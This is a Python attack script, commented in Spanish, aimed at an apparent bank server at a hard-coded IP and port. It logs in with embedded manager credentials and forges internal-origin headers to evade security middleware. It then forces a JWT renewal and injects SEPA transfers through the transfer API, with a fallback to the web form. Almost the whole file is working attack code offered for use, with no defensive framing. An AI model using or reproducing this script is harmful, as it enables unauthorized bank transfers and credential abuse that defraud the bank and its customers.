import requests
import uuid
import re
from datetime import datetime

# === IPs y Dominio ===
BANCO_IP = "80.78.30.242"
PORT = "9181"
HOST_URL = f"http://{BANCO_IP}:{PORT}"
API_LOGIN = f"{HOST_URL}/api/login/"
API_CHALLENGE = f"{HOST_URL}/api/challenge"
API_XFER = f"{HOST_URL}/api/send-transfer"

# === Datos de usuario interno del gerente ===
USERNAME = "markmur88"
PASSWORD = "Ptf8454Jd55"

# === Headers para simular una conexión interna y evitar middlewares de seguridad ===
HEADERS = {
    "Host": BANCO_IP,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es;q=0.9,en;q=0.8",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES",
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Type": "BANCO-INTERNAL",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json"
}

session = requests.Session()
session.headers.update(HEADERS)

# === Paso 1: Limpiar cookies viejas, si habían ===
def clear_session():
    session.cookies.clear()
    print("[+] Sesión limpiada. Comenzando desde cero.")

# === Paso 2: Iniciar sesión web para obtener csrf y sessionid ===
def web_login():
    print("\n[+] Paso 1: Iniciando desde cero. Solicitud GET para csrf...")
    session.get(API_LOGIN)

    # Sacar csrftoken desde cookies o por HTML
    csrftoken = session.cookies.get("csrftoken")
    if not csrftoken:
        print("[-] No hay csrftoken en cookies. Buscando en HTML...")
        html_text = session.get(HOST_URL + "/login/").text
        csrf_match = re.search(r"csrfmiddlewaretoken.*value=\"(.+)\"", html_text)
        if csrf_match:
            csrftoken = csrf_match.group(1)
            session.headers.update({"X-CSRFToken": csrftoken})
        else:
            csrftoken = "dummycsrf"

    print("[+] Obtenido csrftoken:", csrftoken)

    print("\n[+] Paso 2: Logueando al sistema interno del banco...")
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "csrfmiddlewaretoken": csrftoken
    }

    login_response = session.post(
        API_LOGIN,
        json=login_data
    )

    if login_response.status_code == 200:
        print("[+] Sesión web iniciada. Headers actuales:", session.headers)
        print("Respuesta:", login_response.text)
        session.cookies.update(login_response.cookies.get_dict())
        print("Cookies guardadas:", session.cookies.get_dict())
    else:
        print("[-] Error al loguearse desde web.")
        print("Status:", login_response.status_code)
        print("Error:", login_response.text)

# === Paso 3: Renovar token JWT desde challenge interno ===
def request_new_jwt():
    print("\n[+] Paso 3: Forzando renovación de token JWT...")
    challenge_data = {
        "action": "internal_session", 
        "origin": "SEPA", 
        "X-Token-ID": session.cookies.get("sessionid") or "dummy_session"
    }

    session.headers.update({
        "X-CSRFToken": session.cookies.get("csrftoken"),
        "X-Token-ID": session.cookies.get("sessionid") or "",
    })

    challenge_response = session.post(API_CHALLENGE, json=challenge_data)
    if challenge_response.status_code == 200 and "token" in challenge_response.json():
        jwt_token = challenge_response.json()["token"]
        print("[+] ¡Nuevo token JWT obtenido desde challenge:", jwt_token[:100] + "...")
        return jwt_token
    else:
        print("[-] No se renovó token desde challenge. Usaremos token dummy.")
        return "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxxx"

# === Paso 4: Ejecutar la transferencia desde token real ===
def inject_transfer(jwt):
    print("\n[+] Paso 4: Enviando transferencia final con nuevo token...")
    xfer_data = {
        "payment_id": str(uuid.uuid4()),
        "debtor_account_id": 1,            # ID de la cuenta origen desde el banco
        "creditor_account_id": 1,          # ID de la cuenta destino
        "instructed_amount": "100.00",
        "currency": "EUR",
        "purpose_code": "GDSV",
        "remittance_information_unstructured": "Pago aprobado internamente",
        "status": "ACSC",                       # Transferencia completada con éxito
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%TZ")
    }

    session.headers.update({
        "Authorization": f"Bearer {jwt}",
        "X-Token-ID": jwt,
        "Content-Type": "application/json"
    })

    xfer_response = session.post(API_XFER, json=xfer_data)
    print("Status de inyección SEPA:", xfer_response.status_code)
    print("Texto:", xfer_response.text)

    if xfer_response.status_code == 200 or xfer_response.status_code == 201:
        print("\n[+] 💰 **TRANSFERENCIA COMPLETADA** 💰")
    else:
        print("\n[-] Transferencia fallida. Probando desde el formulario web.")

# === Paso 5: Inyectar desde web, si la API no bate ===
def inject_web_form(jwt):
    print("\n[+] Paso final (opcional): Probando inyección directa vía formulario web")

    web_data = {
        "csrfmiddlewaretoken": session.cookies.get("csrftoken"),
        "debtor_account": 1,
        "creditor_account": 1,
        "amount": 100.00,
        "currency": "EUR",
        "purpose": "Pago interno - SEPA",
        "remittance_information_unstructured": "Aprobado por autenticación interna",
        "requested_execution_date": datetime.utcnow().strftime("%Y-%m-%d")
    }

    session.headers.update({
        "X-CSRFToken": session.cookies.get("csrftoken"),
        "Authorization": f"Bearer {jwt}",
        "Referer": f"http://{BANCO_IP}:9181/api/transferencia/",
        "Content-Type": "application/x-www-form-urlencoded"
    })

    web_xfer_response = session.post(f"{HOST_URL}/api/transferencia/", data=web_data)
    print("Status web:", web_xfer_response.status_code)
    print("Respuesta:", web_xfer_response.text)

# === Ciclo completo del ataque desde cero ===
def main():
    clear_session()
    web_login()
    jwt = request_new_jwt()
    inject_transfer(jwt)
    inject_web_form(jwt)

# Ejecución:
if __name__ == "__main__":
    main()